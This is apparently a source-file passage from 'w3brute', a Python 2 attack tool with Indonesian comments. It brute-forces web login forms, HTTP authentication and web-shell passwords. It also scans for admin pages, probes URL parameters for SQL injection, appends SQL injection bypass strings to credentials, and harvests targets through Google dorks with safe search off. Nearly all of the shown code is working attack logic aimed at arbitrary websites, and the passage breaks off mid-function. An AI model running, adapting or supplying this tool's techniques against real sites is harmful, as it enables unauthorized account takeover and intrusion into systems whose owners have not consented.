def openZip(filepath, filename, password=None):
    """
    membuka file didalam file zip
    
    :param filepath: path file zip
    :param filename: nama file yang ada di dalam file zip
    :param password: password file (optional)
    
    :rtype: string
    
    """
    
    zip_ = None
    
    try:
        zip_ = zipfile.ZipFile(filepath)
    
    except IOError, err:
        errMsg = err[1].lower() + ": " + repr(filepath)
        logger.error(errMsg)
        raise W3bruteQuitException
    
    except zipfile.BadZipFile, err:
        errMsg = "".join(err).lower()
        logger.error(errMsg)
        raise W3bruteQuitException
    
    members = zip_.namelist()
    if filename not in members:
        criMsg = "file '%s' is not found in '%s' file" % (filename, filepath)
        logger.critical(criMsg)
        raise W3bruteQuitException
    
    wordlist = None
    
    try:
        wordlist = zip_.read(filename)
    except RuntimeError, err:
        errMsg = "".join(err).lower()
        if not re.search("password required", errMsg, re.IGNORECASE):
            errMsg += ". what happened?"
            logger.error(errMsg)
            raise W3bruteQuitException
        
        if password:
            infoMsg = "[INFO] opening file %s " % repr(filename)
            infoMsg += "in '%s' with password '%s'\n" % (filepath, password)
            cetakData(infoMsg)
            
            try:
                wordlist = zip_.read(filename, pwd=password)
            except RuntimeError, err:
                errMsg = "%s '%s'" % err.args
                logger.error(errMsg.lower())
                raise W3bruteQuitException
            else:
                infoMsg = "[INFO] password: %s (valid)\n" % repr(password)
                cetakData(infoMsg) 
                return wordlist
        else:
            warnMsg = "[WARNING] %s (press 'CTRL-C' to exit)\n" % errMsg
            cetakData(warnMsg)
        
        ignoreInterrupt()
        
        while True:
            try:
                pwd = raw_input("[#] enter password: ").strip() or None
                if pwd is None:
                    continue
            
            except W3bruteNextStepException:
                errMsg = "[ERROR] user quit\n"
                cetakData(errNsg)
                raise W3bruteQuitException
            
            try:
                wordlist = zip_.read(filename, pwd=pwd)
            
            except RuntimeError:
                errMsg = "wrong password: %s" % repr(pwd)
                logger.error(errMsg)
            
            else:
                infoMsg = "[INFO] password: %s (valid)\n" % repr(pwd)
                cetakData(infoMsg)
                break
    
    ignoreInterrupt(False)
    return wordlist

def is_db(object_):
    """
    regex untuk mengetahui
    jika objek adalah *database*
    
    :rtype: boolean
    
    """
    
    if re.search(".*>[\w.]+;.*", object_):
        return True
    
    return False

def parseDbSyntax(object_):
    """
    menguraikan syntax file *database* (web.db)
    
    :rtype: tuple
    
    """
    
    filepath = table_name = column_name = None
    if ">" in object_:
        filepath, table_name = object_.split(">", 1)
    
    if table_name is not None:
        if ";" in table_name:
            table_name, column_name = table_name.split(";", 1)
    
    return filepath, table_name, column_name

def openDb(filepath, table_name, column_name):
    """
    membuka file web.db
    
    :rtype: string
    
    """
    
    conn = sqlite3.connect(filepath)
    conn.text_factory = str
    cur = conn.cursor()
    cur.execute("select %s from %s" % (column_name, table_name))
    data = cur.fetchone()[0]
    return data

def createList(obj, isfile=False):
    """
    cek objek dan convert objek ke list
    """
    
    if os.path.isfile(obj):
        _ = stringToList(openFile(obj))
        return _
    
    elif is_db(obj):
        args = parseDbSyntax(obj)
        _ = stringToList(openDb(*args))
        return _
     
    elif is_zipfile(obj):
        args = parseZipSyntax(obj)
        _ = stringToList(openZip(*args))
        return _
    
    if isfile:
        errMsg = "file %s doest not exists" % repr(os.path.basename(obj))
        logger.error(errMsg)
        
        raise W3bruteQuitException
    
    _ = stringToList(obj)
    return _

def completeUrl(u):
    """
    menambahkan scheme ke url jika URL tidak memiliki `scheme`
    """
    
    if not u.startswith(("http://", "https://")):
        u = "http://" + u
    
    return urllib.unquote(u)

def getNewUrl(u):
    """
    mendapatkan url baru (tanpa path)
    """
    
    up = urlparse.urlparse(u)
    newurl = up.scheme + "://" + up.netloc
    return newurl

def getPage(u):
    """
    mendapatkan nama halaman (yang terakhir)
    untuk proses verifikasi
    """
    
    path = urlparse.urlparse(u).path
    
    if path in ("", "/"):
        errMsg = "page %s is not supported. " % repr(path)
        errMsg += "try using the '--admin' option to help you "
        errMsg += "find the admin login page."
        logger.error(errMsg)
        
        raise W3bruteSkipTargetException
    
    if path.endswith("/"):
        path = path.rstrip("/")
    
    page = path.split("/")
    return page[-1]

def getQuery(u):
    """
    mendapatkan daftar kueri yang ada di url
    """
    
    q = urlparse.urlparse(u).query
    
    if q == "":
        errMsg = "query not found in %s (example target 'http://www.example.com/index.php?id=4')" % repr(u)
        logger.error(errMsg)
        
        raise W3bruteNextStepException
    
    if "&" in q:
        q = q.split("&")
    else:
        q = [q]
    
    return q

def createLogger():
    """
    pengaturan logger untuk mencetak text ke terminal
    """
    
    global logger, stream
    
    logger = logging.Logger("w3bruteLog")
    formatter = logging.Formatter("\r[%(levelname)s] %(message)s")
    logger_handler = ColorizedStreamHandler(sys.stdout)
    logger_handler.setFormatter(formatter)
    logger.addHandler(logger_handler)
    logger.setLevel(logging.INFO)
    
    stream = logger_handler.stream

def getProxy():
    """
    mendapatkan proxy dari opsi (jika digunakan)
    reference: http://www.learntosolveit.com/python/web_urllib2_proxy_auth.html 
    """
    
    proxyDict = {}
    proxy = konf.proxy
    if konf.proxyCred:
        scheme = urlparse.urlsplit(proxy).scheme + "://"
        proxy = proxy.replace(scheme, scheme + konf.proxyCred + "@")
    
    proxyDict[urlparse.urlsplit(proxy).scheme] = proxy
    return proxyDict

def getErrorMessage():
    """
    mendapatkan info `exception` yang tidak ke handle
    """
    
    excInfo = sys.exc_info()
    errMsg = "".join(traceback.format_exception(*excInfo))
    return errMsg

def adminScanner():
    infoMsg = "[INFO] find the admin page...\n"
    cetakData(infoMsg)
    
    pbar = Progress("[INFO] testing page -> ")
    
    found = False
    adminPaths = createList(konf.adminPaths)
    for admin in adminPaths:
        admin = "/" + admin.strip()
        
        pbar.write(admin)
        
        newurl = getNewUrl(target.URL) + admin
        response = UserAgent.open(newurl)
        
        if response.code in (200, 401):
            pbar.newline("[INFO] admin page: {} (valid)")
            target.URL = newurl
            found = True
            break
        
        pindahBaris()
        
    pbar.finish()
    
    if not found:
        filename = os.path.basename(konf.adminPaths)
        if re.search(r"web.db", filename):
            filename = parseDbSyntax(filename)[0]
        
        criMsg = "admin login page not found in database %s" % repr(filename)
        logger.critical(criMsg)
        
        raise W3bruteSkipTargetException
    
    else:
        pass

def sqliScanner():
    """
    SQL injection scanner vulnerability
    untuk mengetahui jika target rentan terhadap SQL injection
    dan biasanya rentan juga di bypass login.
    """
    
    infoMsg = "[INFO] detecting bug SQL injection...\n"
    cetakData(infoMsg)
    
    pbar = Progress("[INFO] testing query -> ")
    query = getQuery(target.URL)
    
    try:
        for kueri in query:
            kueri = kueri.strip()
            for payload in ("'", "\\"):
                pbar.write(kueri)
                old_url = target.URL
                new_url = old_url.replace(kueri, kueri + payload)
                response = UserAgent.open(new_url)
                htmltext = response.read()
                for errMsg in ("You have an error in your.+", "Warning:.+\(\)"):
                    if re.search(errMsg, htmltext, re.IGNORECASE):
                        msg = "[INFO] query: {} detected (vuln)"
                        pbar.newline(msg)
                        pbar.finish()
                        
                        raise W3bruteNextStepException
                    
                    pindahBaris()
        
        pbar.finish()
        
    except W3bruteNextStepException:
        infoMsg = "target is detected vulnerable by the SQL injection method"
        
        if not konf.sqliBypass:
            infoMsg += ". use the '--sqli-bypass' option to activate "
            infoMsg += "SQL injection bypass authentication technique."
        
        logger.info(infoMsg)
    
    else:
        warnMsg = "target is not vulnerable to the SQL injection method"
        logger.warning(warnMsg)

def getSchemeAuth(headers):
    """
    mendapatkan `scheme` atau `tipe`
    autentikasi target via HTTP header `WWW-Authenticate`
    """
    
    scheme = "basic"
    if headers.has_key("www-authenticate"):
        value = headers["www-authenticate"]
        scheme = value.split(" ", 1)[0].lower()
    
    return scheme

def getRequestData(form):
    """
    cek jika form menggunakan aksi javascript
    """
    
    _data = list(form.click_request_data())
    _is_js = False
    
    if re.search("(?i)javascript?\:(?:[;]*|.+?\(\))|.+?\(\)", _data[0]):
        _is_js = True
    elif re.search("(?i)javascript:", _data[0]):
        _is_js = True
    
    if _is_js:
        criMsg = "w3brute is not supported for "
        criMsg += "submitting forms on site interfaces "
        criMsg += "that use javascript."
        logger.critical(criMsg)
        raise W3bruteSkipTargetException
    
    _data[2] = dict(_data[2])
    req = urllib2.Request(*_data)
    
    return req

def setKredensial():
    infoMsg = "[INFO] preparing credentials...\n"
    cetakData(infoMsg)
    
    sliceUser = parseSlice(konf.sliceUser)
    slicePass = parseSlice(konf.slicePass)
    usernames = sorted(createList(konf.usernames))
    passwords = sorted(createList(konf.passwords))
    
    # slice object (start) harus kurang dari len(object)
    if sliceUser.start >= len(usernames):
        sliceUser.start = 0
    
    if slicePass.start >= len(passwords):
        slicePass.start = 0
    
    usernames = usernames[sliceUser]
    passwords = passwords[slicePass]
    
    if konf.mixedCred and konf.sqliBypass:
        warnMsg = "[WARNING] if you want to use the '--mixed-cred' option "
        warnMsg += "please do not use the '--sqli-bypass' option\n"
        cetakData(warnMsg)
        
        time.sleep(1) # durasi untuk anda membaca pesan.
        
        infoMsg = "[INFO] SQL injection bypass authentication techniques are disabled\n"
        cetakData(infoMsg)
        
        del konf.sqliBypass
    
    if auth.IS_WEBSHELL_AUTH and (konf.sqliBypass or konf.mixedCred):
        msg = "[ASK] do you want to use "
        msg += "SQL injection bypass authentication technique "
        msg += "on the web shell? (y/N): "
        jawaban = raw_input(msg).lower()
        if jawaban.startswith("n"):
            del konf.sqliBypass
            del konf.mixedCred
    
    if auth.IS_EMAIL_AUTH and not konf.sqliBypass:
        # konfigurasi kredensial untuk autentikasi
        # yang menggunakan email
        domains = createList(defaults.domain)
        
        if not konf.domain:
            msg = "[ASK] do you want to add a domain for email? "
            msg += "(default %s) (Y/n): " % repr(defaults.domain)
            jawaban = raw_input(msg).lower()
            if jawaban.startswith("y"):
                msg = "[#] enter domain (e.g. yahoo.com,mail.org): "
                domen = raw_input(msg).lower().strip()
                if len(domen) > 0:
                    domen = createList(domen)
                    domains.extend(domen)
        
        else:
            domen = createList(konf.domain)
            domains.extend(domen)
        
        domains = sorted(domains)
        infoMsg = "[INFO] adding domain to username...\n"
        cetakData(infoMsg)
        
        maxval = len(usernames) * len(domains)
        suffix = "%(curval)d/%(maxval)d %(percent)d%%"
        spin = Spinner("[INFO] current progress: ", maxval=maxval, suffix=suffix)
        
        _ = []
        
        try:
            for username in usernames:
                for domen in domains:
                    spin.show_progress()
                    
                    if domen.startswith("@"):
                        domen = domen.lstrip("@")
                    
                    if not re.search("[\w\.-]+@[\w\.-]+", username):
                        user = username + "@"
                        user += domen
                        _.append(user)
                    else:
                        _.append(username)
        
        except W3bruteNextStepException:
            pass 
        
        spin.done()
        usernames = _
        del _
    
    if not auth.IS_WEBSHELL_AUTH and konf.mixedCred:
        infoMsg = "[INFO] adding SQL query to username...\n"
        cetakData(infoMsg)
        
        sqliQuery = createList(defaults.sqliQuery)
        maxval = len(usernames) * len(sqliQuery)
        suffix = "%(curval)d/%(maxval)d %(percent)d%%" 
        spin = Spinner("[INFO] current progress: ", maxval=maxval, suffix=suffix)
        
        _ = []
        
        try:
            for username in usernames:
                for query in sqliQuery:
                    spin.show_progress()
                    
                    user = username + query
                    _.append(user)
        
        except W3bruteNextStepException:
            pass
        
        spin.done()
        usernames = _
        del _
    
    if auth.IS_WEBSHELL_AUTH and konf.mixedCred:
        infoMsg = "[INFO] adding SQL query to password...\n"
        cetakData(infoMsg)
        
        wordlist = usernames + passwords
        sqliQuery = createList(defaults.sqliQuery)
        maxval = len(wordlist) * len(sqliQuery)
        suffix = "%(curval)d/%(maxval)d %(percent)d%%" 
        spin = Spinner("[INFO] current progress: ", maxval=maxval, suffix=suffix)
        
        _ = []
        
        try:
            for username in usernames:
                for query in sqliQuery:
                    spin.show_progress()
                    
                    user = username + query
                    _.append(user)
        
        except W3bruteNextStepException:
            pass
        
        spin.done()
        credDb.wordlist = _
        konf.webShellCred = True # konfigurasi jika wordlist telah di atur.
        del _
    
    if konf.sqliBypass:
        # jika opsi --sqli-bypass digunakan
        # maka username dan password akan menggunakan
        # SQL injection query
        sqliQuery = createList(defaults.sqliQuery)
        usernames = sqliQuery
        passwords = sqliQuery
    
    ##########################
    # konfigurasi kredensial #
    ##########################
    
    if auth.IS_WEBSHELL_AUTH and not konf.mixedCred:
        credDb.wordlist = usernames + passwords
        konf.webShellCred = True # ^
    
    if not auth.IS_WEBSHELL_AUTH:
        credDb.passwords = passwords
        
        if auth.IS_EMAIL_AUTH:
            credType = "email"
            # tambahkan konfigurasi emailCred
            # jika username dan password telah di atur.
            # jadi tidak akan mengatur ulang kembali proses
            # penyiapan kredensial (username dan password)
            konf.emailCred = True
        else:
            credType = "standard"
            konf.standardCred = True # ^
        
        credDb[credType] = PyDict()
        credDb[credType].usernames = usernames
        
        del usernames, passwords
    
    infoMsg = "preparing credentials is complete"
    logger.info(infoMsg)

def checkCredential():
    """
    memeriksa jika daftar kredensial sudah diatur
    """
    
    # cek jika kredensial untuk autentikasi standard dan Authorization belum di atur.
    if (auth.IS_STANDARD_AUTH or auth.IS_AUTHORIZATION) and konf.standardCred is None:
        setKredensial()
    
    # cek jika kredensial untuk autentikasi email belum di atur.
    elif auth.IS_EMAIL_AUTH and konf.emailCred is None:
        setKredensial()
    
    # cek jika kredensial alias wordlist belum di atur.
    elif auth.IS_WEBSHELL_AUTH and konf.webShellCred is None:
        setKredensial()

def ignoreInterrupt(value=True):
    """
    mengabaikan interupsi
    """
    
    konf.handleInterrupt = not value

def pindahBaris():
    """
    memeriksa permintaan pindah ke garis baru
    dari <class 'Progress'>
    """
    
    if konf.garisBaru:
        cetakData("\n")
        del konf.garisBaru 

def getCredentialType():
    """
    mendapatkan tipe kredensial
    """
    
    credType = "account" if not auth.IS_WEBSHELL_AUTH else "password"
    return credType

def checkRegexValid(response):
    """
    memeriksa jika anda menggunakan (opsi --regex-valid)
    ini digunakan untuk proses verifikasi akun/password
    """
    
    if konf.regexValid:
        if re.search(konf.regexValid, response.read()):
            status.valid = True

def addCredential(*values):
    """
    menambahkan kredensial
    """
    
    kredensial.append(values)

def resetStatus():
    """
    mengatur ulang `status` kredensial
    """
    
    status.found = status.valid = False 

def showPrompt():
    """
    memeriksa jika anda menggunakan (opsi --ask-found)
    ini digunakan untuk proses verifikasi akun/password
    """ 
    
    if konf.askFound:
        msg = "[ASK] what do you want? "
        msg += "[(C)ontinue (default) / (s)kip target / (q)uit]: "
        jawaban = raw_input(msg).lower().strip() or "c"
        if jawaban.startswith("s"):
            raise W3bruteStopBruteForceException
        elif jawaban.startswith("q"):
            konf.quit = True
            raise W3bruteStopBruteForceException
        elif jawaban.startswith("c"):
            pass
        else:
            raise W3bruteQuitException     

def checkStopSearch():
    """
    memeriksa jika anda menggunakan (opsi --stop-search)
    ini digunakan untuk mengontrol proses mencari akun.
    """ 
    
    if konf.stopSearch:
        infoMsg = "[INFO] option '--stop-search' is used. "
        infoMsg += "process of searching for an '%s' was stopped.\n" % getCredentialType()
        cetakData(infoMsg)
        raise W3bruteStopBruteForceException

def checkMaxSearch():
    """
    memeriksa jika anda menggunakan (opsi --max-search)
    ini digunakan untuk mengontrol proses mencari akun.
    """
    
    if isinstance(konf.maxSearch, int):
        if len(kredensial) == konf.maxSearch:
            infoMsg = "[INFO] process of searching for '%(credType)s' has reached the limit. "
            infoMsg += "try to use greater than %d (e.g. '--max-search %d') " % (konf.maxSearch, konf.maxSearch * 2) 
            infoMsg += "to search for more '%(credType)ss'.\n"
            infoMsg %= dict(credType=getCredentialType())
            cetakData(infoMsg)
            
            raise W3bruteStopBruteForceException 

def checkStatus(*cred):
    """
    memeriksa `status` kredensial
    """
    
    if (status.found or status.valid):
        stat = "potentially" if not status.valid else "valid"
        msg = "[INFO] %s -> {} (%s)" % (getCredentialType(), stat)
        pbar.newline(msg)
        info = cred + (stat,)
        addCredential(*info)
        resetStatus()
        showPrompt()
        checkStopSearch()
        checkMaxSearch()

def bruteForceAttack():
    global pbar
    
    infoMsg = "starting attacks..."
    logger.info(infoMsg)
    regexp = re.compile(target.PAGE, re.I)
    
    if not auth.IS_AUTHORIZATION:
        form = html.form
        field = html.field
    
    try:
        # bilang ke interrupt handler
        # jika w3brute sedang menjalankan sesi bruteforce
        konf.bruteSession = True
        
        if not auth.IS_WEBSHELL_AUTH:
            # mendapatkan daftar username sesuai tipe autentikasi.
            credType = "standard" if not auth.IS_EMAIL_AUTH else "email"
            usernames = sorted(credDb[credType].usernames)
            passwords = sorted(credDb.passwords)
            
            pbar = Progress("[INFO] testing account -> ")
            
            for username in usernames:
                username = username.strip()
                
                for password in passwords:
                    password = password.strip()
                    
                    msg = "{0} : {1}".format(username, password)
                    pbar.write(msg)
                    
                    authcred = None
                    
                    if auth.IS_AUTHORIZATION:
                        authcred = (username, password)
                        url = target.URL
                    else:
                        form[field.username] = username
                        form[field.password] = password
                        
                        url = getRequestData(form)
                    
                    response = UserAgent.open(url, authCred=authcred)
                    
                    # mendapatkan informasi jika akun 'berpotensi'
                    # dari respon url setelah melakukan POST DATA
                    try:
                        newUrl = response.geturl()
                        if not regexp.search(newUrl):
                            status.found = True
                    
                    except AttributeError:
                        # XXX: tidak bisa memanggil :func: geturl()
                        #      pada tipe autentikasi *digest* ?
                        #      why?
                        pass
                    
                    checkRegexValid(response) 
                    checkStatus(username, password)
                    pindahBaris()
        
        else:
            pbar = Progress("[INFO] testing password -> ")
            
            wordlist = sorted(credDb.wordlist)
            for password in wordlist:
                password = password.strip()
                
                pbar.write(password)
                form[field.password] = password
                url = getRequestData(form)
                
                try:
                    # mendapatkan informasi jika password (berpotensi)
                    # dari respon kode HTTP
                    response = UserAgent.open(url, allow_redirects=False)
                except W3bruteRedirectException:
                    status.found = True
                
                checkRegexValid(response) 
                checkStatus(password)
                pindahBaris() 
    
    except W3bruteStopBruteForceException:
        pass
    
    # bilang ke interrupt handler
    # kalau sesi bruteforce sudah selesai.
    del konf.bruteSession
    
    pbar.finish()
    
    # cek jika sudah dapat akun berpotensi
    if len(kredensial) > 0:
        infoMsg = "w3brute managed to get %d potential %s" + ("s" if len(kredensial) > 1 else "")
        infoMsg %= (len(kredensial), getCredentialType())
        logger.info(infoMsg)
        
        fp = createFileObject()
        fieldnames = ["username", "password"] if not auth.IS_WEBSHELL_AUTH else ["password"]
        fieldnames.insert(0, "#")
        fieldnames.append("status")
        
        output = OutputWriter(fp, fieldnames, konf.fileFormat)
        
        maxval = len(kredensial)
        spin = Spinner("[INFO] saving results... ", maxval=maxval)
        
        try:
            for (num, kred) in enumerate(kredensial):
                num += 1
                kred = (num,) + kred
                output.add_row(*kred)
                spin.show_progress()
        
        except W3bruteNextStepException:
            pass
        
        output.close()
        spin.done()
        
        infoMsg = "results of the w3brute are stored in %s" % repr(fp.name)
        logger.info(infoMsg)
        
        konf.selesai = True
    
    else:
        clearLine()
        
        warnMsg = "[WARNING] w3brute has not managed to find a potential '%s'. " % getCredentialType()
        warnMsg += "please try again later.\n"
        cetakData(warnMsg)
    
    if isinstance(konf.quit, bool):
        raise W3bruteQuitException
    
    raise W3bruteSkipTargetException

def getTarget():
    """
    mendapatkan daftar target
    """
    
    targetList = None
    
    if not konf.googleSearch:
        targetList = createList(*konf.target)
        
        infoMsg = "[INFO] total target: %d\n" % len(targetList)
        cetakData(infoMsg)
    
    else:
        try:
            targetList = searchGoogle()
        
        except W3bruteNextStepException:
            raise W3bruteQuitException
        
        except Exception:
            errMsg = "what happened?. %s" % getErrorMessage()
            logger.error(errMsg)
            raise W3bruteQuitException 
        
        if targetList is None:
            warnMsg = "[WARNING] unsuccessful in getting search results with dork %s. " % repr(konf.googleDork)
            warnMsg += "try using another dork (e.g. 'inurl:/admin/index.php')\n"
            cetakData(warnMsg) 
            
            raise W3bruteQuitException
        
        infoMsg = "google search results get %d target(s)" % len(targetList)
        logger.info(infoMsg)
        
        charunik = os.urandom(4).encode("hex")
        filename = "result-dorking-w3brute-" + charunik
        format = "txt"
        fp = createFileObject(filename, format, False)
        
        maxval = len(targetList)
        spin = Spinner("[INFO] saving results... ", maxval=maxval)
        
        try:
            for url in targetList:
                fp.write(url + "\n")
                spin.show_progress()
        
        except W3bruteNextStepException:
            pass
        
        fp.close()
        spin.done()
        
        infoMsg = "dorking results are stored in %s" % repr(fp.name)
        logger.info(infoMsg)
    
    return targetList

def checkScanner():
    """
    memeriksa opsi scanner
    """
    
    if konf.sqliScanner:
        try:
            sqliScanner()
        except W3bruteNextStepException:
            pass
    
    if konf.adminScanner:
        adminScanner()

def checkTarget():
    """
    memeriksa target jika support di bruteforce
    """
    
    url = target.URL
    target.HOST = urlparse.urlparse(url).netloc
    
    infoMsg = "[INFO] check the target if the target has the potential to attack...\n"
    cetakData(infoMsg)
    
    response = UserAgent.open(url)
    target.PAGE = getPage(response.geturl())
    code = response.code
      
    if code == 401:
        auth.IS_AUTHORIZATION = True
    
    elif code == 200:
        infoMsg = "[INFO] search form...\n"
        cetakData(infoMsg)
    
    else:
        errMsg = "[ERROR] HTTP error code %d (%s)\n" % (code, repr(response.reason))
        cetakData(errMsg)
        raise W3bruteSkipTargetException
    
    parsed = ParseResponse(response)
    
    if len(parsed.forms) > 0 or code == 401:
        if code != 401:
            infoMsg = "detected target has %d forms" % len(parsed.forms)
            logger.info(infoMsg)
        else:
            headers = response.info()
            auth.type = getSchemeAuth(headers)
        
        return parsed
    
    else:
        criMsg = "form not found. "
        
        if not konf.adminScanner:
            criMsg += "try using the '--admin' option to help you "
            criMsg += "find the admin login page."
        
        logger.critical(criMsg)
        raise W3bruteSkipTargetException

def searchGoogle():
    infoMsg = "[INFO] google dorking is running, please wait...\n"
    cetakData(infoMsg)
    
    dork, page = konf.target
    page = page if page > 1 else 1
    # atur kembali
    konf.googleDork = dork
    
    data = {
        "q": dork,
        "num": 100,
        "hl": "en",
        "complete": 0,
        "safe": "off",
        "filter": 0,
        "btnG": "search",
        "start": page
    }
    
    url = "https://www.google.com/search?" + urllib.urlencode(data)
    response = UserAgent.open(url)
    htmltext = response.read()
    
    if re.search("(?i)captcha", htmltext):
        criMsg = "can't get dorking results. "
        criMsg += "captcha challenge detected"
        
        logger.critical(criMsg)
        raise W3bruteNextStepException
    
    soup = BeautifulSoup(htmltext)
    h3tags = soup.findAll("h3", attrs={"class":"r"})
    urls = [urlparse.parse_qsl(urlparse.urlsplit(tag.a["href"]).query)[0][1] for tag in h3tags]
    
    return urls or None

def clearData():
    """
    membersihkan data
    """
    
    auth.clear()
    html.clear()
    target.clear() 

def initOptions(options):
    """
    mengatur nilai opsi ke data konfigurasi
    """
    
    optDict = options.__dict__
    
    if options.targetUrl is not None:
        value = optDict.pop("targetUrl")
        konf.target = (value, False)
    
    elif options.targetFile is not None:
        value = os.path.realpath(optDict.pop("targetFile"))
        konf.target = (value, True)
    
    elif options.googleDork is not None:
        value = optDict.pop("googleDork")
        page = optDict.pop("googlePage")
        konf.target = value, page or defaults.googlePage
        konf.googleSearch = True
    
    for (option, value) in optDict.items():
        if option in defaults.keys():
            if value is None:
                value = defaults[option]
                
                if option in ("timeout", "delay"):
                    value = float(value)
                
                if option == "domain":
                    value = None
                
                konf[option] = value
            
            else:
                
                if option == "outputDir":
                    value = os.path.realpath(value)
                
                konf[option] = value
        
        else:
            konf[option] = value

def init():
    """
    fungsi yang akan dijalankan
    """
    
    InterruptHandler() # mendaftarkan interrupt handler
    checkScanner() # cek opsi scanner
    
    parsed = checkTarget() # cek jika target didukung untuk melakukan bruteforce attack
    parsed.getValidForms() # mendapatkan form yang menuju ke dashboard situs.
    parsed.getTipeAutentikasi() # mendapatkan tipe autentikasi target
    parsed.getParameterForm() # mendapatkan paramater(s) untuk masuk ke situs
    
    checkCredential() # memeriksa daftar kredensial
    bruteForceAttack() # memulai brute force attack 

def cmdLineParser():
    """
    konfigurasi optparse
    """
    
    prog = os.path.basename(sys.argv[0])
    usage = "%s" % (prog if IS_WIN else "python " + prog)
    usage += " [options]"
    
    parser = optparse.OptionParser(usage=usage, formatter=PrettyHelpFormatter())
    parser.disable_interspersed_args()
    
    try:
        parser.add_option("-v", "--version", dest="version", action="store_true", help="show program's version number and exit")
        
        # Target options.
        target = optparse.OptionGroup(parser, "Target", "this option is used to get or enter a specific target(s).")
        
        target.add_option("-t", "--target", dest="targetUrl", metavar="url", help="target URL (e.g. http://www.example.com/admin/login.php)")
        target.add_option("-l", dest="targetFile", metavar="file", help="load target from file (e.g. /path/to/target.txt)")
        target.add_option("-g", dest="googleDork", metavar="dork", help="find target(s) with google dork (e.g. inurl:/adm/medsos.php)")
        
        # Credential options.
        credential = optparse.OptionGroup(parser, "Credential", "this option is used to enter a list of usernames, passwords and domains. "
            "which will be used to find target account / password.")
        
        credential.add_option("-u", "--user", dest="usernames", metavar="username", help="username or FILE (e.g. /path/to/usernames.txt)")
        credential.add_option("-p", "--pass", dest="passwords", metavar="password", help="password or FILE (e.g. /path/to/passwords.txt)")
        credential.add_option("-d", "--domain", dest="domain", help="email domain (default %s)" % defaults.domain)
        
        # Request options.
        request = optparse.OptionGroup(parser, "Request", "this option is used to connect to target.")
        
        request.add_option("--agent", dest="agent", help="HTTP User-Agent header value to send to server")
        request.add_option("--timeout", dest="timeout", metavar="seconds", type="float", help="socket timeout (default %d)" % defaults.timeout)
        request.add_option("--retries", dest="retries", type="int", help="limit repeats connection if connection has a problem (default %d)" % defaults.retries)
        request.add_option("--delay", dest="delay", metavar="seconds", type="float", help="waiting time when response connection is problematic (default %d)" % defaults.delay)
        request.add_option("--proxy", dest="proxy", help="use a proxy to connect to target (e.g. http://127.0.0.1:8080)")
        request.add_option("--proxy-cred", dest="proxyCred", metavar="cred", help="proxy credentials (e.g. username:password)", default="DONT_MAKE_UNIQUE_OPTION")
        
        # Scanner options.
        scanner = optparse.OptionGroup(parser, "Scanner", "this option is used to help you find / get target information")
        
        scanner.add_option("--sqli", dest="sqliScanner", action="store_true", help="SQL injection scanner vulnerability")
        scanner.add_option("--admin", dest="adminScanner", action="store_true", help="admin page scanner")
        
        # Attack options.
        attack = optparse.OptionGroup(parser, "Attack", "this option is used to select attack method to be used.")
        
        attack.add_option("--sqli-bypass", dest="sqliBypass", action="store_true", help="SQL injection bypass authentication technique")
        attack.add_option("--mixed-cred", dest="mixedCred", action="store_true", help="mixed credentials (username + SQL injection query)")
        
        # Controller options.
        controller = optparse.OptionGroup(parser, "Controller", "this option is used to control account lists and brute force attack sessions.")
        
        controller.add_option("--slice-user", dest="sliceUser", metavar="slice", help="slicing username from list")
        controller.add_option("--slice-pass", dest="slicePass", metavar="slice", help="slicing password from list") 
        controller.add_option("--stop-search", dest="stopSearch", action="store_true", help="stop brute force process if you have found a potential account")
        controller.add_option("--max-search", dest="maxSearch", metavar="int", type="int", help="limit for searching for potential accounts")
        
        # Verifying options.
        verifying = optparse.OptionGroup(parser, "Verifying", "this option is used for verification process if account or password (web shell) is valid")
        verifying.add_option("--ask-found", dest="askFound", action="store_true", help="prompt to ask for an answer if you find a potential account")
        verifying.add_option("--regex-valid", dest="regexValid", metavar="regex", type="string", help="regex to find out if account is valid (e.g. '(?i)Dashboard')")
        
        # Other options.
        other = optparse.OptionGroup(parser, "Other")
        other.add_option("--output-dir", dest="outputDir", metavar="dir", help="output directory (default %s)" % defaults.outputDir)
        other.add_option("--rest-name", dest="filename", help="result file name (default %s)" % repr(defaults.filename))
        other.add_option("--rest-format", dest="fileFormat", metavar="format", choices=["html", "sqlite3"], help="result file format (%s (default), HTML, or SQLITE3)" % defaults.fileFormat.upper())
        other.add_option("--admin-paths", dest="adminPaths", metavar="file", help="list admin page to scan")
        other.add_option("--google-page", dest="googlePage", metavar="page", type="int", help="google page that will be scanned (default %d)" % defaults.googlePage)
        
        # fitur ini, hanya untuk lebar terminal kurang dari atau sama dengan 50
        # seperti layar smartphone?.
        if getTerminalSize()[0] <= 50:
            other.add_option("--disable-wrap", dest="disableWrap", action="store_true", help="disable line wrapping")
        
        other.add_option("--no-color", dest="noColor", action="store_true", help="disable color for output text in terminal")
        
        parser.add_option_group(target)
        parser.add_option_group(credential)
        parser.add_option_group(request)
        parser.add_option_group(scanner)
        parser.add_option_group(attack)
        parser.add_option_group(controller)
        parser.add_option_group(verifying)
        parser.add_option_group(other)
        
        def smartCapitalize(object_):
            """
            fungsi untuk mengubah karakter (huruf awal) string
            ke huruf besar (kapital), jika huruf awal adalah huruf kecil. 
            """
            
            awal = object_[0]
            if awal.isalpha() and awal.islower():
                # ubah huruf awal saja menjadi huruf kapital.
                object_ = awal.upper() + object_[1:]
            
            return object_
        
        opt = parser.get_option("-h")
        opt.help = smartCapitalize(opt.help)
        opt = parser.get_option("-v")
        opt.help = smartCapitalize(opt.help)
        
        def makeUniqueShortOption(long_opt):
            """ membuat opsi pendek unik
            
            long_opt = --hello-world
            
            :return: -hW
            
            """
            
            opt = long_opt.lstrip("-").split("-")
            uniqueOpt = "-" + opt[0][0] + opt[1][0].upper()
            return uniqueOpt
                
        # persiapan untuk membuat opsi unik
        uniqueOptDict = dict()
        for groups in parser.option_groups:
            options = groups.option_list
            for option in options:
                if len(option._short_opts) == 0 and len(option._long_opts) == 1:
                    long_opt = option.get_opt_string()
                    if long_opt.count("-") == 3:
                        if option.default != "DONT_MAKE_UNIQUE_OPTION":
                            uniqueOpt = makeUniqueShortOption(long_opt)
                            if uniqueOpt not in uniqueOptDict.keys():
                                # mengatur opsi unik ke optparse
                                option._short_opts = [uniqueOpt]
                                # simpan opsi unik
                                uniqueOptDict[uniqueOpt] = long_opt
                        else:
                            # kembalikan nilai default opsi ke None
                            parser.set_default(option.dest, None)
                
                option.help = smartCapitalize(option.help)
        
        def isUniqueOption(opt):
            """
            memeriksa jika objek adalah
            opsi unik.
            """
            
            if opt.startswith("-") and opt.count("-") == 1:
                name = opt.lstrip("-")
                if len(name) >= 2:
                    return True
            return False
        
        def prepareOption(argv):
            """
